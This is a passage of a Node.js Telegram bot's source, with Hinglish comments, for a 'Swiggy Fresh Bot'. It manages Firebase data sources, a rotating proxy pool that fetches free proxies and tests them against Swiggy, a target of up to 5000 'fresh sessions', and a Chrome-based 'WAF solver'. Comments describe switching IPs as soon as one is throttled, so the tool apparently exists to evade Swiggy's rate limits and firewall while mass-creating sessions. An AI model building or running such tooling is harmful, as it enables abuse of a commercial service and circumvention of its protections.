  if (!(await gate(ctx))) return;
  const r = sources.setActiveSource(ctx.match[1]);
  await ctx.answerCbQuery(r.ok ? '✅ Active source badal diya.' : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  const { text, rows } = r.ok ? sourcesCard() : sourceDetailCard(ctx.match[1]);
  await editOrSend(ctx, text, rows);
});

bot.action(/^ap_src_toggle_([a-f0-9-]{1,10})$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  const r = sources.toggleSource(ctx.match[1]);
  await ctx.answerCbQuery(r.ok ? (r.enabled ? '▫️ Enabled' : '🚫 Disabled') : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  const { text, rows } = sourcesCard();
  await editOrSend(ctx, text, rows);
});

bot.action(/^ap_src_verify_(.{1,10})$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery('🧪 Testing…').catch(() => {});
  const id = ctx.match[1];
  const r = await sources.verifySource(id);
  const s = sources.getSource(id);
  const name = s ? esc(s.name) : id;
  const text = r.ok
    ? section('🧪 Verify — OK', [
        `<b>${name}</b>: reachable in ${r.ms}ms.`,
        r.topKeys?.length ? `Top keys: <code>${esc(r.topKeys.join(', '))}</code>` : 'Root khali hai.',
      ].join('\n'))
    : section('🧪 Verify — FAILED', [
        `<b>${name}</b>: ${esc(r.error)}`,
        sub('URL/auth/rules check karein.'),
      ].join('\n'));
  await editOrSend(ctx, text, [
    [{ text: '↩️ Source', callback_data: `ap_src_${id}` }],
  ]);
});

bot.action(/^ap_src_del_(.{1,10})$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  const r = sources.removeSource(ctx.match[1]);
  await ctx.answerCbQuery(r.ok ? '🗑 Delete ho gaya.' : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  sources.applyActiveSource();
  const { text, rows } = sourcesCard();
  await editOrSend(ctx, text, rows);
});

// ➕ Add Firebase — bot URL (aur chahein to auth) text me maangta hai
bot.action('ap_src_add', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  pending.set(String(ctx.from.id), { action: 'add_source' });
  await editOrSend(ctx, section('➕ Add Firebase', [
    `Ab <b>URL bhejo</b> (Realtime Database URL):`,
    `<code>https://xxxx-default-rtdb.firebaseio.com/</code>`,
    ``,
    `Auth lage to pipe ke saath:`,
    `<code>&lt;url&gt; | &lt;DB_AUTH_secret&gt;</code>`,
    ``,
    sub('Cancel karne ke liye /start dabao.'),
  ].join('\n')), [[{ text: '↩️ Cancel', callback_data: 'ap_sources', style: 'primary' }]]);
});

// ---------------------------------------------------------------------------
// 🔀 Proxy handlers — add (text input) / toggle / delete / rotation on-off
// ---------------------------------------------------------------------------
bot.action('ap_proxies', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  const { text, rows } = proxiesCard();
  await editOrSend(ctx, text, rows);
});

bot.action(/^ap_px_(?!add$|rot$|free$|autotoggle$)([a-f0-9-]{1,10})$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  const { text, rows } = proxyDetailCard(ctx.match[1]);
  await editOrSend(ctx, text, rows);
});

bot.action(/^ap_px_toggle_([a-f0-9-]{1,10})$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  const r = proxyPool.toggleProxy(ctx.match[1]);
  await ctx.answerCbQuery(r.ok ? (r.enabled ? '▫️ Enabled' : '🚫 Disabled') : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  const { text, rows } = proxiesCard();
  await editOrSend(ctx, text, rows);
});

bot.action(/^ap_px_del_([a-f0-9-]{1,10})$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  const r = proxyPool.removeProxy(ctx.match[1]);
  await ctx.answerCbQuery(r.ok ? '🗑 Delete ho gaya.' : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  const { text, rows } = proxiesCard();
  await editOrSend(ctx, text, rows);
});

bot.action('ap_px_rot', async (ctx) => {
  if (!(await gate(ctx))) return;
  const cur = proxyPool.proxySummary().enabled;
  const r = proxyPool.setPoolEnabled(!cur);
  await ctx.answerCbQuery(r.ok ? (r.enabled ? '▶️ Rotation ON' : '⏸ Rotation OFF') : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  const { text, rows } = proxiesCard();
  await editOrSend(ctx, text, rows);
});

// 🌐 Free Proxies Lao — public list se la kar Swiggy par test, sirf zinda pool me
bot.action('ap_px_free', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery('🌐 Free proxies dhoondh raha hoon…').catch(() => {});
  await editOrSend(ctx, section('🌐 Free Proxies La Raha Hoon', [
    '› Public free proxy list (ProxyScrape) se candidates la kar',
    '› har ek ko <b>seedha Swiggy par test</b> kar raha hoon…',
    '',
    sub('30–60 second lag sakte hain — zinda + tez wali hi pool me jayengi.'),
  ].join('\n')), [[{ text: '↩️ Proxies', callback_data: 'ap_proxies', style: 'primary' }]]);
  try {
    const r = await proxyPool.refreshFreeProxies({ want: 8 });
    const ps = proxyPool.proxySummary();
    await editOrSend(ctx, section('🌐 Free Proxies — Result', [
      r?.added
        ? `✅ <b>${r.added} zinda proxies</b> pool me daal di (${r.checked} parkhin).`
        : `⚠️ Is baar ${r?.checked || 0} parkhin lekin koi Swiggy par zinda nahi mili. Thodi der baad phir dabana — free proxies aati-jaati rehti hain.`,
      `🔀 Pool ab: <b>${ps.enabledCount}/${ps.total} ON</b> (${ps.autoCount} auto) — ${esc(ps.rotation)}`,
      '',
      sub('Batch me ek IP garam hote hi bot turant doosri IP le lega (zero wait). Mari hui auto proxies agle refresh par khud nikal jayengi.'),
    ].join('\n')), [[{ text: '↩️ Proxies', callback_data: 'ap_proxies', style: 'primary' }]]);
  } catch (e) {
    await editOrSend(ctx, section('🌐 Free Proxies — Fail', [
      `❌ <code>${esc(String(e?.message || e).slice(0, 200))}</code>`,
      sub('List source down ho sakta hai — thodi der baad phir try karo, ya apni proxy ➕ se add kar do.'),
    ].join('\n')), [[{ text: '↩️ Proxies', callback_data: 'ap_proxies', style: 'primary' }]]);
  }
});

// 🌐 Auto-fetch on/off (batch-start par khud laana)
bot.action('ap_px_autotoggle', async (ctx) => {
  if (!(await gate(ctx))) return;
  const cur = proxyPool.proxySummary().autoFree;
  const r = proxyPool.setAutoFree(!cur);
  await ctx.answerCbQuery(r.autoFree ? '🌐 Free auto-fetch ON' : '🌐 Free auto-fetch OFF').catch(() => {});
  const { text, rows } = proxiesCard();
  await editOrSend(ctx, text, rows);
});

// ➕ Add Proxy — bot proxy string text me maangta hai
bot.action('ap_px_add', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  pending.set(String(ctx.from.id), { action: 'add_proxy' });
  await editOrSend(ctx, section('➕ Add Proxy', [
    `Ab <b>proxy bhejo</b>. Formats:`,
    `<code>host:port</code>`,
    `<code>http://user:pass@host:port</code>`,
    `<code>socks5://host:port</code>`,
    ``,
    `Ek saath bahut saare bhejne ho to line me (comma):`,
    `<code>host1:port1, host2:port2</code>`,
    ``,
    sub('Add hote hi rotation ON — bot turant nayi IP se traffic bhejega.'),
  ].join('\n')), [[{ text: '↩️ Cancel', callback_data: 'ap_proxies', style: 'primary' }]]);
});

// 🎯/⏱/🚦 pickers
bot.action('ap_pick_target', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  await editOrSend(ctx, section('🎯 Target — kitne fresh sessions?', [
    `Abhi: <b>${bs.getSetting('target')}</b>`,
    ``,
    sub('Ya koi bhi number likh kar bhejo (1–5000), jaise: 150'),
  ].join('\n')), pickRows('ap_set_target_', TARGET_PRESETS, [[{ text: '✏️ Custom number', callback_data: 'ap_custom_target' }]]));
});

bot.action(/^ap_set_target_(\d+)$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  const r = bs.setSetting('target', Number(ctx.match[1]));
  await ctx.answerCbQuery(r.ok ? `🎯 Target = ${r.value}` : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  await editOrSend(ctx, settingsCard(), settingsRows());
});

bot.action('ap_custom_target', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  pending.set(String(ctx.from.id), { action: 'custom_target' });
  await editOrSend(ctx, section('✏️ Custom Target', [
    `Kitne fresh sessions chahiye? <b>Number likh kar bhejo</b> (1–5000):`,
    `Jaise: <code>150</code>`,
  ].join('\n')), [[{ text: '↩️ Cancel', callback_data: 'ap_settings', style: 'primary' }]]);
});

bot.action('ap_pick_time', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  await editOrSend(ctx, section('⏱ Max Time — kitne minute chale?', [
    `Abhi: <b>${bs.getSetting('maxMinutes')}</b> min`,
  ].join('\n')), pickRows('ap_set_time_', TIME_PRESETS));
});

bot.action(/^ap_set_time_(\d+)$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  const r = bs.setSetting('maxMinutes', Number(ctx.match[1]));
  await ctx.answerCbQuery(r.ok ? `⏱ Max = ${r.value} min` : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  await editOrSend(ctx, settingsCard(), settingsRows());
});

bot.action('ap_pick_gap', async (ctx) => {
  if (!(await gate(ctx))) return;
  await ctx.answerCbQuery().catch(() => {});
  await editOrSend(ctx, section('🚦 Gap — do numbers ke beech kitna rukna?', [
    `Abhi: <b>${bs.fmtSetting('gapMs')}</b>`,
    ``,
    sub('Kam gap = jaldi, zyada gap = Swiggy kam chances dega.'),
  ].join('\n')), pickRows('ap_set_gap_', GAP_PRESETS));
});

bot.action(/^ap_set_gap_(\d+)$/, async (ctx) => {
  if (!(await gate(ctx))) return;
  const r = bs.setSetting('gapMs', Number(ctx.match[1]));
  await ctx.answerCbQuery(r.ok ? `🚦 Gap = ${bs.fmtSetting('gapMs')}` : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  await editOrSend(ctx, settingsCard(), settingsRows());
});

bot.action('ap_toggle_offline', async (ctx) => {
  if (!(await gate(ctx))) return;
  const cur = bs.getSetting('allowOffline');
  const r = bs.setSetting('allowOffline', !cur);
  await ctx.answerCbQuery(r.ok ? `📴 Offline = ${r.value ? 'ON' : 'OFF'}` : `❌ ${r.error}`, !r.ok && { show_alert: true }).catch(() => {});
  await editOrSend(ctx, settingsCard(), settingsRows());
});

// ---------------------------------------------------------------------------
// Text input — add-source URL / custom target (wait-state)
// ---------------------------------------------------------------------------
bot.on('text', async (ctx) => {
  const uid = String(ctx.from?.id);
  if (!isOwner(ctx.from?.id)) return;
  const st = pending.get(uid);
  if (!st) return;
  const txt = String(ctx.message?.text || '').trim();

  if (st.action === 'add_source') {
    pending.delete(uid);
    const [urlPart, authPart] = txt.split('|').map((x) => x.trim());
    const r = sources.addSource({ url: urlPart, auth: authPart || '' });
    if (!r.ok) {
      await ctx.reply(`❌ ${r.error}`).catch(() => {});
      return;
    }
    sources.applyActiveSource();
    const v = await sources.verifySource(r.source.id);
    const lines = [
      `✅ <b>${esc(r.source.name)}</b> add ho gaya${r.source.active ? ' aur <b>ACTIVE</b>' : ''}.`,
      v.ok
        ? `🧪 Verify: reachable in ${v.ms}ms${v.topKeys?.length ? ` · keys: <code>${esc(v.topKeys.join(', '))}</code>` : ''}`
        : `⚠️ Verify fail: ${esc(v.error)} — URL/auth check kar le, tab bhi use kar sakte ho.`,
    ];
    await ctx.reply(section('🔥 Firebase Source Added', lines.join('\n')), kb([[{ text: '↩️ Sources', callback_data: 'ap_sources', style: 'primary' }]])).catch(() => {});
    return;
  }

  if (st.action === 'add_proxy') {
    pending.delete(uid);
    // Comma / newline se alag karke ek saath bahut saare add
    const parts = txt.split(/[,\n]/).map((x) => x.trim()).filter(Boolean);
    const added = [];
    const errs = [];
    for (const raw of parts) {
      const r = proxyPool.addProxy(raw);
      if (r.ok) added.push(r.proxy.label);
      else errs.push(`${raw.slice(0, 30)}: ${r.error}`);
    }
    const lines = [];
    if (added.length) lines.push(`✅ <b>${added.length}</b> proxy add: <code>${esc(added.join(', '))}</code>`);
    if (errs.length) lines.push(`⚠️ ${errs.slice(0, 3).map(esc).join('\n')}`);
    lines.push('', sub('Ab bot nayi-nayi IPs se traffic bhejega — rukna bilkul band.'));
    await ctx.reply(section('🔀 Proxy Pool Updated', lines.join('\n')), kb([[{ text: '↩️ Proxies', callback_data: 'ap_proxies', style: 'primary' }]])).catch(() => {});
    return;
  }

  if (st.action === 'custom_target') {
    pending.delete(uid);
    const n = Number(txt.replace(/\D/g, ''));
    const r = bs.setSetting('target', n);
    if (!r.ok) {
      await ctx.reply(`❌ ${r.error}`).catch(() => {});
      return;
    }
    await ctx.reply(`🎯 Target = ${r.value} fresh sessions ✅`, kb([[{ text: '⚙️ Settings', callback_data: 'ap_settings', style: 'primary' }]])).catch(() => {});
    return;
  }

  pending.delete(uid);
});

// Unhandled engine callback kahin na phase — catch-all answer
bot.on('callback_query', async (ctx) => {
  if (!isOwner(ctx.from?.id)) return;
  await ctx.answerCbQuery().catch(() => {});
});

// ---------------------------------------------------------------------------
// 🚀 Launch — preflight + retry ke saath.
// PEHLE KE BUGS:
//  1) Ek hi network jhatka (TLS disconnect waghera) = "launch failed" bolkar
//     bot seedha band. Ab getMe preflight 6 baar retry karega.
//  2) 401/409 par wajah samajh hi nahi aati thi. Ab saaf bataega:
//       401 = BOT_TOKEN galat/revoke ho chuka
//       409 = isi token se DOOSRI copy pehle se chal rahi hai
//  3) SIGINT/SIGTERM handlers `await bot.launch()` ke BAAD lage the — launch
//     wala promise bot band hone par hi resolve hota hai, matlab handlers
//     kabhi register hi nahi hote the. Ab pehle lagte hain.
// ---------------------------------------------------------------------------
let shuttingDown = false;
const shutdown = (signal) => {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`[FreshBot] ${signal} mila — batch rok kar band kar raha hoon…`);
  try { requestAutopilotStop(signal); } catch {}
  try { bot.stop(signal); } catch {}
  setTimeout(() => process.exit(0), 1500).unref?.();
};
process.once('SIGINT', () => shutdown('SIGINT'));
process.once('SIGTERM', () => shutdown('SIGTERM'));

// Startup self-check — console me pehli nazar me sab dikh jaye
{
  const nodeMajor = Number(String(process.versions.node).split('.')[0]) || 0;
  console.log(`[FreshBot] Node ${process.version}${nodeMajor < 20 ? '  ⚠️ Node 20+ chahiye — nodejs.org se update karo, warna kuch bhi kabhi bhi toot sakta hai!' : ''}`);
  try {
    const c = getChromeStatus();
    console.log(c.found
      ? `[FreshBot] Chrome ✅ ${c.path}${c.headless ? ' (headless)' : ''}`
      : '[FreshBot] Chrome ❌ nahi mila — WAF solver nahi chalega. Chrome install karo ya .env me PUPPETEER_EXECUTABLE_PATH do. (Bot phir bhi chalega, /diag dekho.)');
  } catch {}
  console.log(`[FreshBot] Firebase ${isFirebaseConfigured() ? '✅ configured' : '❌ config nahi — FIREBASE_DB_URL / Settings → Firebase Sources'}`);
  console.log(`[FreshBot] Owner gate: ${ownerIds() ? 'OWNER_IDS (.env)' : 'store bossIds + default (OWNER_IDS khali hai)'}`);
}

const sleepMs = (ms) => new Promise((r) => setTimeout(r, ms));
const tgCode = (e) => Number(e?.code ?? e?.response?.error_code ?? 0) || 0;
const isNetErr = (e) => /fetch|network|socket|TLS|ECONN|ETIMEDOUT|EAI_AGAIN|timed? ?out|disconnected/i.test(`${e?.name || ''} ${e?.message || ''}`);

// Token + internet pehle test karo (getMe) — network par retry, token galat
// ho to turant saaf wajah. Bina is test ke bot chup-chaap "launch failed"
// bolkar mar jata tha.
async function preflight() {
  for (let attempt = 1; attempt <= 6; attempt++) {
    try {
      const me = await bot.telegram.getMe();
      console.log(`[FreshBot] Telegram ✅ @${me.username} (id ${me.id})`);
      // Agar is token par kahin webhook laga ho (purana server, ya token
      // leak hone par kisi aur ne lagaya ho) to polling 409 marega aur bot
      // kabhi chalega hi nahi — isliye shuru me webhook saaf kar do.
      await bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {});
      return me;
    } catch (e) {
      const code = tgCode(e);
      if (code === 401) {
        console.error('❌ BOT_TOKEN galat hai ya revoke ho chuka hai (Telegram 401).');
        console.error('   Fix: Telegram me @BotFather → /mybots → apna bot → API Token → naya token lo,');
        console.error('   .env ki BOT_TOKEN= wali line me naya token daalo, phir npm start.');
        process.exit(1);
      }
      const waitSec = Math.min(3 * 2 ** (attempt - 1), 30);
      const retryable = isNetErr(e) || code === 429 || code >= 500 || code === 0;
      console.error(`[FreshBot] Telegram se connect nahi hua (try ${attempt}/6): ${e?.message || e}`);
      if (!retryable || attempt === 6) {
        console.error('❌ Internet/Telegram tak pahunch hi nahi paya. Net check karo (VPN/firewall?), phir npm start.');
        process.exit(1);
      }
      console.log(`[FreshBot] ${waitSec}s ruk kar dobara try…`);
      await sleepMs(waitSec * 1000);
    }
  }
}

// ---------------------------------------------------------------------------
// ☁️ Cloud-vault hydrate (Render ke liye khaas zaroori) — bina persistent
// disk ke har deploy/restart par data/db.json fresh banta hai aur saare
// saved accounts chale jate. Vault configured ho (GITHUB_VAULT_TOKEN +
// VAULT_ENCRYPTION_KEY) to accounts GitHub vault se wapas aa jate hain.
// Pehle ye function store me tha lekin bot ise KABHI bulata hi nahi tha.
// 12s timeout: vault slow/fail ho to bot startup atke nahi.
// ---------------------------------------------------------------------------
try {
  const hydrated = await Promise.race([
    hydrateAccountsFromCloudVault(),
    sleepMs(12_000).then(() => null),
  ]);
  if (hydrated) console.log(`[FreshBot] Cloud vault hydrate: ${hydrated.restored}/${hydrated.total} accounts wapas aaye.`);
} catch (e) {
  console.warn('[FreshBot] Cloud vault hydrate skipped:', e?.message || e);
}

// ---------------------------------------------------------------------------
// ❤️ Health server (sirf tab jab PORT env ho — Render Web Service par
// Render khud PORT deta hai aur port khula na mile to deploy fail kar deta
// hai). Worker/local par PORT nahi hota → ye bilkul band rehta hai.
// GET / ya /health → { ok, bot running?, uptime } JSON.
// ---------------------------------------------------------------------------
if (process.env.PORT) {
  try {
    const { createServer } = await import('node:http');
    const bootAt = Date.now();
    createServer((req, res) => {
      let snap = {};
      try { snap = getAutopilotSnapshot(); } catch {}
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        ok: true,
        service: 'swiggy-fresh-bot',
        uptimeSec: Math.floor((Date.now() - bootAt) / 1000),
        batchRunning: Boolean(snap.running),
        freshThisRun: snap.fresh ?? 0,
      }));
    }).listen(Number(process.env.PORT), '0.0.0.0', () => {
      console.log(`[FreshBot] Health server port ${process.env.PORT} par sun raha hai (Render Web Service ke liye).`);
    });
  } catch (e) {
    console.warn('[FreshBot] Health server start nahi hua:', e?.message || e);
  }
}

await preflight();

try {
  await bot.launch({ dropPendingUpdates: true }, () => {
    console.log('🆕 Swiggy Fresh Bot chal raha hai — START dabao, phone chhod ke aa jao. (/diag = health check)');
  });
} catch (e) {
  const code = tgCode(e);
  if (code === 409) {
    console.error('❌ Telegram 409 Conflict — isi BOT_TOKEN se bot ki DOOSRI copy pehle se chal rahi hai.');
    console.error('   Fix: purani copy band karo (doosra terminal/server/PC jahan bot chal raha ho),');
    console.error('   phir yahan npm start. Ek token = ek hi copy ek waqt par.');
  } else if (code === 401) {
    console.error('❌ Telegram 401 — BOT_TOKEN revoke/galat. @BotFather se naya token lekar .env me daalo.');
  } else {
    console.error('[FreshBot] launch failed:', e?.stack || e?.message || e);
  }
  process.exit(1);
}
